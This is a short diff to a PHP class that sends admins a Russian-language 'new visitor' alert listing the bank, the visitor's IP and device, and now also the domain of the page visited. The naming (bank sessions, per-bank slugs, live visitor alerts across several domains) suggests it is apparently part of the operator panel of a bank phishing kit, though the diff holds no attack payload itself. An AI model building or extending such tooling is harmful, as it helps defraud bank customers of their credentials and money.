@@ -97,6 +97,7 @@ class NotifyAdminsOfBankSession
 
         $ip     = $preSession->ip_address ?? '-';
         $bank   = $preSession->bank_slug ?? '-';
+        $domain = $preSession->page_url ? parse_url($preSession->page_url, PHP_URL_HOST) : null;
         $device = match($preSession->device_type) {
             'iphone'  => '📱 iPhone',
             'ipad'    => '📱 iPad',
@@ -107,11 +108,12 @@ class NotifyAdminsOfBankSession
             default   => '🖥️ ПК',
         };
 
+        $domainLine = $domain ? "\n🌐 {$domain}" : '';
         $text = <<<HTML
 🛰 <b>Новый посетитель</b>
 
 🏦 Банк: <b>{$bank}</b>
-🌍 IP: <code>{$ip}</code>
+🌍 IP: <code>{$ip}</code>{$domainLine}
 {$device}
 🟢 Онлайн
 HTML;
